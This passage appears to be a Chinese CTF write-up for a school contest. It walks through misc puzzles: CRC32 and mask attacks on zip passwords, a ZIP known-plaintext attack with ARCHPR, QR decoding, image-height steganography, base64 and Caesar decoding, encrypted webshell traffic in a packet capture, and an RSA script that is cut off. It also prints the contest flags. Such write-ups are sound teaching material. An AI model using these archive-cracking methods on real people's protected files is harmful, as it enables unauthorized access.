src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=YzNjMDQ4OTY0NGZlYmEyZWZkZDNjNTc0MTQ0NDJmMWFfV0N3VUdGWk5jUHFHZ1NFckxLejBDSFdXSUFJRjJLcDVfVG9rZW46T3hPYWJhaVdZb3V5alR4RWx4aWNKakVCbk5jXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p>保存成压缩包形式打开后</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=N2RlODVmOWYzNzMxNDU3NTRlMTI3M2UyNzMwZjU0ZjdfV2xwWW9maFRTY0R6UEkybVBlWnVKRWZFZFpZWU12VzZfVG9rZW46WFNXNWJ0ckFBb0dUb1F4NzFvQWMxbndWbktoXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p>发现每一个文本中都有循环冗余，原始大小都为6字节</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MDM1OTYwMWQyZjFjMmNiYWQ4YTQ3MTQyODdiNjMzMGFfUjMweU02WEtReWs2Sm1OY1h0RElRdGRUZW5Fc2Z5N3VfVG9rZW46RjUzbGIyclpGb3VhOGV4Nlc1QmNPZVE5blpkXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p>依次暴破</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MzAzYzk1ZGU1Y2NkZjg1MjU4ZjdjYjg4MDMwMDFlMDJfSzg4RGl4WWVURTBUMU1ZQzJRNTVWbmJyZmp3aGJhbUxfVG9rZW46Tm9ocmJtVGY3b2FmMjZ4WWJuVGNDYzlPblllXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MjZhN2M5NDA2MTdjMTA2MmUzNTBhNmY3NzZlM2RkZDZfOG1TU0llWXA1eXY3NUNKbXRsN3R0TVFIRk5HUWtnUTBfVG9rZW46WkE5U2J5T0tGb2k2cjd4OXA1ZGNYdkdMbmNLXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=YTc5NmY4MTE0ZWJjYWY4ZGFiODM1MTBmNTFmOGMwNTJfV1hXWmt1NWlUUnVxQkdQTDQ3YVF1VlRreGwxbmthdTNfVG9rZW46R0kxcWJEZGtjb1kxeXd4cEk1UGNNcks2bkE0XzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ODY2N2MxYjJlOWM1ZGFmZWZjOGRjYTc2NmMzMDcxNDlfdVNJeHBoNjNCT2lBVU1QOTI3cUN3YlZOS05iZ2hnSVRfVG9rZW46UEhuV2JUTHZDb2l1VFZ4b1NnT2N4blMybmdjXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p>找到了压缩文件密码，如下：</p><p><strong><code>oh_you_are_9ood_at_CRC32</code></strong></p><p>解压完成后打开，内容如下：</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MzQwZGU1YjQ1ZDBiN2UwM2ZkOTc2NzE4YjE2ZTYyZDJfQ1dqQWxDRDZRV3FXZ3l2YVRaTGtwcmQwMWxzMllOcE1fVG9rZW46SktXOGJSbG5Kb0ltMUd4bnVqZ2NjZlZQbjRiXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p>看他的文件头，就可以发现这是一个gif动图，将其复制进010中并保存</p><p>重新打开后就可以看到转瞬即逝的flag，利用stegsolve分析</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=YmNhODJkMTkyNmJhYmE4OGM3YTBhNDViZjRjZGE3MWFfNlZlRFk3dXIzaG9TSkk2VzZuRXVxY2xzS2tFck9VdnFfVG9rZW46R3dNa2J5NE9rb3h3ZzJ4ZGJFM2NZaGUzbkpnXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p>选择Frame Browser对动图进行逐帧分析</p><p>得到</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=N2Q2OGQzMGI2YzdiYWNkYmRhZDJiYzAzMjIwMWYyOWZfZmt3ZldlbXVRemhFaUtOUWFidHdaeTU2M2t2b1FHY0ZfVG9rZW46VzlBVmJIZFlVbzBCeU14TU45ZmNzSk5IblRjXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QLNU&#123;L1st3n_bE4ut1ful_5ong&#125;</span><br></pre></td></tr></table></figure><h2 id="Ez-QR"><a href="#Ez-QR" class="headerlink" title="Ez_QR"></a>Ez_QR</h2><p>下载并解压附件后是50个二维码</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MTljNTUyODM0MzUzODkwYWFjNGVkMzA5MGY0YzZlMWRfTGNoU2tTR1FkdjB0RnFaWDhVdWlGQ3FmbUE5c0l0c1RfVG9rZW46SHpXcGJuMVJKb0lwdmt4YnpDSWNGRnRJbjdlXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><p>依次扫描 ，组合，就得到flag</p><h3 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h3><p>利用python脚本来解决，但是我这个脚本有些许复杂，它只能出来单个的，并且是乱序，需要自己进行排序。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> glob</span><br><span class="line"><span class="keyword">import</span> zxing</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_qr_code</span>(<span class="params">image_path</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; 读取二维码图片并解析其内容 &quot;&quot;&quot;</span></span><br><span class="line">    reader = zxing.BarCodeReader()</span><br><span class="line">    barcode = reader.decode(image_path)</span><br><span class="line">    <span class="keyword">return</span> barcode.raw <span class="keyword">if</span> barcode <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_flag_from_folder</span>(<span class="params">folder_path</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; 扫描文件夹中的所有二维码图片并分别显示解析内容 &quot;&quot;&quot;</span></span><br><span class="line">    qr_files = glob.glob(os.path.join(folder_path, <span class="string">&quot;*.png&quot;</span>)) + \</span><br><span class="line">               glob.glob(os.path.join(folder_path, <span class="string">&quot;*.jpg&quot;</span>)) + \</span><br><span class="line">               glob.glob(os.path.join(folder_path, <span class="string">&quot;*.jpeg&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> qr_files:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;未找到二维码图片&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    flag_parts = []</span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> <span class="built_in">sorted</span>(qr_files):  <span class="comment"># 按文件名排序，确保顺序正确</span></span><br><span class="line">        content = read_qr_code(file)</span><br><span class="line">        <span class="keyword">if</span> content:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;文件: <span class="subst">&#123;os.path.basename(file)&#125;</span> -&gt; 内容: <span class="subst">&#123;content&#125;</span>&quot;</span>)</span><br><span class="line">            flag_parts.append(content)</span><br><span class="line"></span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span>.join(flag_parts)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n完整 Flag:&quot;</span>, flag)</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    folder_path = <span class="string">r&quot;D:\第二次校赛\attachment_QR&quot;</span>  <span class="comment"># 你的二维码图片文件夹路径</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(folder_path):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;文件夹不存在，请检查路径是否正确！&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        extract_flag_from_folder(folder_path)</span><br></pre></td></tr></table></figure><p>他的输出结果就是下面这样</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NzU5YTAyNzg2ODRiZWQ1ZmU1ZjdhZDNjMTJhMTlhNzVfWlN0Z2RBdWMyRjJnRjh4WVNsTlRuZTMzSjZNcDZ1UVFfVG9rZW46RWZnR2IyeEI0b1NFeWR4N0wwVWNzeDZFblpnXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><h3 id="方法三："><a href="#方法三：" class="headerlink" title="方法三："></a>方法三：</h3><p>利用网站批量扫描 <a href="https://cli.im/deqr/other">https://cli.im/deqr/other</a></p><h2 id="你是mvp还是躺赢狗？"><a href="#你是mvp还是躺赢狗？" class="headerlink" title="你是mvp还是躺赢狗？"></a>你是mvp还是躺赢狗？</h2><p>打开附件后是下面的这样的一张图</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MjJkZjNlZjQ2NDQ3NzE0Zjk5YjRkYzI2ODUyNmI0MDlfYXg0NDg4c1dBV0g0QmZJalB5NXY5Z2dRcDNBbjhEbkRfVG9rZW46TmJYSGJKT1lZb1pFcHV4MnZOcmNIS0xUblRjXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p>将其拖进010，看看有没有隐藏的东西</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MWI2NWIxNDhkZjZkM2QzZDJiMTllYTI0ZWQ4NmM5YzNfekNjamloOWRrMVNDTWlleTVFMUpPU1NTZDhDRnlvREpfVG9rZW46V210MGI0dGlCb1RQdkh4U1hia2NtQUJNbnloXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p>在010中可以看出有另外一个压缩包，复制后在010中新建一个文件，并保存</p><p>打开后 ，是这样的一幅图</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MTYxYjRhMDMwMmY4NDE4NDE0MWRjOWYzNDU2Y2IxNjVfZHJYVzVnbU1rZmh2V0hsdzRmR2kzbEJBUmNHVTg2OW9fVG9rZW46SnNBWGJYVzRDb0MxZGR4WkFFOWNxU0JLbmRnXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p>很显然，图片的高度被切割了</p><p>可以在010中修改图片的高度，像下面橘色区域的位置，我这是已经修改好的</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MGVjODRmZDllY2ExNWQzOTQ1YjE3MDdhYjA1ZTc4ZTJfRjJMd3Y3QUVBSUh0ZkpRNzRFZmZjMzg2bW1BMmV3Yk5fVG9rZW46UGU5d2J2TXpCb1RqWkh4MEZzVmM1MkdSbnBkXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p>保存后，重新打开这张图片就能看到被隐藏的flag</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=Nzk1ZjQ1ZjM3MGQ1MWNlYTI2ZDJhZWQzZWU3YzFjNmNfYTVOUnBDRWNueUhCbzlhVE5GTlh1S1FndnkzZ05ySkpfVG9rZW46RjlOeWJobExSb09mQjh4SVBaT2NWVGxwbnZiXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QLNU&#123;l00k_1n_My_3ye5_!&#125;</span><br></pre></td></tr></table></figure><h2 id="奇怪的动图"><a href="#奇怪的动图" class="headerlink" title="奇怪的动图"></a>奇怪的动图</h2><p>根据提示，这道题目利用明文攻击</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NzI0ZTYxZmQ2MDMyODk5NzI2YzY5YTczNTc3MWVkZDBfVzA4MXc2RVpUcmw1SlBFVDlUcnVMV1FyVVhsaTJnVzFfVG9rZW46TEszOWJKVW01b2d4dDV4akxndWNkNWtabmFmXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p>压缩orgin.gif成zip文件</p><p>利用ARCHPR工具进行明文攻击</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=Y2IwZDdjMzYyMTYzYjczMmE4ODQxMjZmZDdhNzY3YWJfRHdQTEFJZEt4YXlEQVdlZzlxU3FWbVZ0emFyckpBNmhfVG9rZW46U1ZJUmI2Umtsb0U3aGh4VmZvdWN1cks3bnZjXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=YTFiOTAyZjQ4NTJiOGI1NjI4OTMwNjBmMmY5NGEwN2FfMU9Pd1l6dkpSUExsWU5wOEFoVWJ0eFdaYkRNcndvMnZfVG9rZW46QURYNmJ3SUNHb0tTS094S0xPVmM4VTZtbnZkXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p>我们根据wp中已知：flag的二进制数列转换成不同大小的帧间隔（因为gif非常的卡）</p><p>利用puzzlesolve提取帧间隔</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NjFlYzg5MGFlMjJjYmMwNjJkODgzNmM1OTU5Yzk4YTNfazNsajdXTFJTZm03VzE1eDF3VXJDdkt0V2N3bUpFQllfVG9rZW46WTdZNGJIWkxBb3BZMWh4UWZzdGNqZXlKbm9iXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p>利用赛博厨子</p><p>将30改0，130改1，如下：</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MTEyNmE2MThhYjBkMzZiNzVjOWU0OTVlZmRmM2M2MWNfdVR0TGcyWFFKVmRUbnJEajZSZ3NnYVhnelB6bDRnRTJfVG9rZW46TnZ3OWI0MXNmb2ZtTVF4Ym10TmM2VkNVbkFiXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0100000000110001010001100101111101101001001101010101111101100001011011010100000001111010001100010110111000111001</span><br></pre></td></tr></table></figure><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MjIyYTBiNjVlNjI3YjliYmQyN2VjNWU0OTRlYmE4YzdfazVobjBVRHhXTTZUbHNsN3RHa21zOTZoRW1URGt0TFFfVG9rZW46SnFQYmJFbXd2b3lPRXl4NjR6OWNrYmdJbjhPXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p>得到flag：<code>QLNU&#123;@1F_i5_am@z1n9&#125;</code></p><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>打开后说flag为UUxOVXtxMW51X3l5ZDUhfQ&#x3D;&#x3D;</p><p>利用赛博厨子进行转换，最终得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QLNU&#123;q1nu_yyd5!&#125;</span><br></pre></td></tr></table></figure><h2 id="生日的祝福"><a href="#生日的祝福" class="headerlink" title="生日的祝福"></a>生日的祝福</h2><p>从祝福信中</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NzY1ZmQyOGY0OWIyNGE0MGY1Zjc0Y2Q5NDA2M2E2NDRfcFpzcEgzbjdNT1FaN2Q5UXY1T0dxY3hHVmlwQTZ2d0ZfVG9rZW46SjhPVWJ2SzZQb0FSOEN4VVV0dGNKRkZublllXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p>得到密码的形式，及使用binwalk工具</p><p>另外我们还有一个不知格式的生日礼物</p><p>我们看看它的十六进制，看看有什么隐藏的线索</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDNjZmY1NTM0YWQ2M2NiZTUwMTFiNDE5YTRiZGMxYWRfZTBSYnFmQTZvWDJ0dzh5MU1NVmpRYmlIZjdpTEkwQ05fVG9rZW46TDNPWmJIdGFRbzNoQm14d1BMVWNNWkdhbkNhXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p>新建一个文件，将下面的十六进制文本复制，如下：</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjZiNmUyNGIxNDNhYjlhYjhjNDk4MWJmMjg4MTgyZDBfMnlYNU13Mmo2SFFUa3o2T2p0Q3hTVFEySTljQURrZkhfVG9rZW46T2xoMWJRZlJib1ZJYm54eGhFdGNkdWRnbk1lXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p>保存成zip文件</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MWQwMTkyMWMzMzc2NTdmMTY5ZWE3YWFhZGU4NWYzYTJfaUVGbjJMb2dvUWd0SDdUWUZGRlRDMjB3WlNqeUowTk5fVG9rZW46UDBPaWJyUE9JbzhjN0Z4STJKUWNBNE5Gbkp0XzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p>这个时候要找到压缩文件的密钥，也就是从生日祝福中得到的线索</p><p>这个时候利用我们已知的信息进行掩码攻击</p><p>格式：<code>??-18??-??-14</code></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ZmIwOGJlMzEyM2MxNjdhODFlYzM0YjVmMzdjY2I2NWZfQ2lwc2Y0cjVTd2prR3I2TTR2U2ZyYXllSGR5c2NjTzdfVG9rZW46SU1PNGI0SENVb0E3UXh4TGtNbGN4Q3h4blBmXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=OTc1Y2QxYzA0MGVkMTQzYTJiYzNkMGUxOWZiYmIzZTBfNEhXZk1XVVJVN0NVbTNlbHZuMUJ5VUxrM2MxaDZuY0NfVG9rZW46SklWSGJId0NZb25VWWN4NFdSSWNjN1NybjRlXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p>得到密码为<code>xy-1845-11-14</code></p><p>放进赛博厨子，进行了16次不换表base64解密，即偏移量为16</p><p>打开后看到</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjIyYTAyZDQ0ODUzYjdlNDBiZTYxYWJjZWU4ODMxODJfOXpIUkdQV1lkeUFOS3A2ME4wbFNFSVA1azF1SERrSktfVG9rZW46VGYyQ2JPWmpLb0k5cFR4SldLQWM1b2xNbkxoXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p>我们在另外一个文件中看到</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=YzY1Nzk0YjRiNWI4ODRjNWFkNjdjNDEzYzFkYzg1OTFfelZBdkkwWFJVRUp3MEVld2R1RUF0YUxHTnlXQlpCNTlfVG9rZW46Tk5tQmI2bEV1b1JTM014TDRid2MwcDl2bnliXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p>给他进行凯撒解码，得到</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NzU2ODBkMjFiMDY5ZGU5NzFjM2MxNmFmMTU4N2U1YmFfWjM1VlJzWGtuenN2UDhiZ3NhWjRpdWVuQUxHdEo5M1FfVG9rZW46VEF5VmJWZFVNb3lEeDZ4aXhSZmNlR3FObnVjXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p>这样就得到新表为：<code>ABCDEFGabcdefghijklmnopqrstuvwxyzHIJKLMNOPQRST0123456789+/UVWXYZ</code></p><p>再进行base64解码，4次，得到flag</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=YTY4MGVlMDA3ZTQzYjMyNDNkYWIyYTEyYzRlNjFhNzFfREhsblBDd044aklYVzlYenZvNmNpTERGVXJaTkduQ0RfVG9rZW46RXdEM2JSM0RDbzdjVUN4WldnUmNLZER0bkxlXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QLNU&#123;Y0u_@r4_gO0d_Ctfer!&#125;</span><br></pre></td></tr></table></figure><h2 id="NetTraffic"><a href="#NetTraffic" class="headerlink" title="NetTraffic"></a>NetTraffic</h2><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=YjU3ODUwMTFmZDVmY2QzMTc5OWJlMzc3Y2UzMGQyOTVfUlVBNkhod1hhVjRtTFgzZFpiWjd0WGhOVTdEb3VSZU1fVG9rZW46RzJrUGJIajJMb1YweXh4REtYbmNDOUtWblBkXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NjEzZGM4MDg0YzllZTY0MDZiMGFhOTNlZGEzZjNmOTRfWDc5S2VPemJDRHZoQjQzeHRjZ2FoemRPbHdkUmE3emVfVG9rZW46R1UwQmJuc2RUbzBDTDN4a3FIZmNiMnZLbkJjXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e45e329feb5d925b</span><br></pre></td></tr></table></figure><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MGQ0ZDUzMTA5MGRlYjdhNmI0ODgzMDM0ZmQ4NTkyNzBfSk1kckloTlJVY0ZkSG16VkM4RVlKUFp1MWxxYXNIUHNfVG9rZW46RG5ISWJ3d3kzb3NXbXB4S0lJYWNGMWJXbndmXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mAUYLzmqn5QPDkyI5lvSp0fjiBu1e7047YjfczwY6j7iPM15/igg+WdSX6rY+JBrmtNQgtQXXmACCBBgYmo3UC3C0ttYlk6fo7cEZ4KL2ywLgZlrAte/3VIAP80dXyUz/tEWGpwURP8oXl3z7kUkzk1oWz3A7q76gXiDzi0WuWNBNNOd/IKpT3XrRVblJ3yMo0N8Frw9kmCkJpK8gnIKag==</span><br></pre></td></tr></table></figure><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ZWUzNmUwYmNjNjNlODg5Y2NhODU4ZTJmZTExN2Y1M2NfQ1lhc3ZpcTNEQVlWdVg4cnFrRjY1SmRrdVBNZHFob1pfVG9rZW46QUNmNWJmejJKb0R4bU94VGh1YmNIWUFVbjZiXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p>继续往下找</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTE0YzkwMWU4NjdkZTA0NmEzNzEwNGZjMjA4NWJlNjVfeXhlZVZQa2w5bGJTQ2xSaTFVWThBVExqNVpxSGZvWGVfVG9rZW46QnhwZGJLT3NQb1hEWGd4aXRlTGNwZ1lXbjNnXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mAUYLzmqn5QPDkyI5lvSp0fjiBu1e7047YjfczwY6j6FRdeJTeKrveUGDa4E0d7ntz2dsvDXhVWBK0RRSwrdm5Puy5yjoJ/kEwBRPs7RVZed8+l7HBOmx/mDvLCbKp8V</span><br></pre></td></tr></table></figure><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=YTUxODA4NzkwMTFjNjYyNmE1MTM3MGFiYmY4YzkzNDdfak1WQk9McEdJWUZRd0hyTm0wSGF5VFl4blhWTXlGUTdfVG9rZW46SWNPV2JncjI4b0JTM2F4Q3d2UmNaanBQbklmXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=OTk0MDgwMzYzNjVmZmVkOGQxNzE4YmQzMzhkODc1ZDJfbnRpSm5IOXZIQ1dpejJmSUlnZVRDcnlYTFkwVXZNSzVfVG9rZW46VHpEMWJsUXRzb2VaNzN4elZ3SGNMRVFqbkhkXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p>获得flag：<code>QLNU&#123;b3h1NdEr_WebShEll_A_L1ttle_hArd&#125;</code></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="ez-rsa"><a href="#ez-rsa" class="headerlink" title="ez_rsa"></a>ez_rsa</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">p= <span class="number">90387314829577654422580031074599849052489238017386590909427609518517830566632094153174983956061626373542148240632197282485834233498500360232839084537084441830816514377758069170092001168381491479309335271918675512196998198539464292877701133358699988066055212018603381917137199082127062670061784408062745010247</span></span><br><span class="line"></span><br><span class="line">q= <span class="number">131956964140437962238499019120856300797119073778027003002410884250396411838742340328080251408907361408806296819791922928892510090479973276769850659868697243411701946298190698869130430898400373194761890908225250866477990376871572627474128475108692336502916114993456438619932236295206409818033775388146000072237</span></span><br><span class="line"></span><br><span class="line">e= <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">c=<span class="number">10410921907308276410589892193503777002613206525409600556582550130141239927384225094961244567250536114378262855720197279202379339896438970790676722385500897567129069224577416685817545829358494364962182199000462733858163411476930100883908770692701838181723658773973906387237278170734899690708594256204971349985771317564511229193597685929139414357691595246148020635838183673924739613551091535814336813669476452556824499750065035663728996877554070485866597029563465929590470889674480345186537435258607153437323899798451617074637518593529083308029187565110013064533249964278447406229869537622883525179107457102587647233026</span></span><br><span class="line"></span><br><span class="line">求明文m</span><br></pre></td></tr></table></figure><p>利用脚本来解决</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse</span><br><span class="line"></span><br><span class="line"><span class="comment"># 给定的参数</span></span><br><span class="line">p = <span class="number">90387314829577654422580031074599849052489238017386590909427609518517830566632094153174983956061626373542148240632197282485834233498500360232839084537084441830816514377758069170092001168381491479309335271918675512196998198539464292877701133358699988066055212018603381917137199082127062670061784408062745010247</span></span><br><span class="line">q = <span 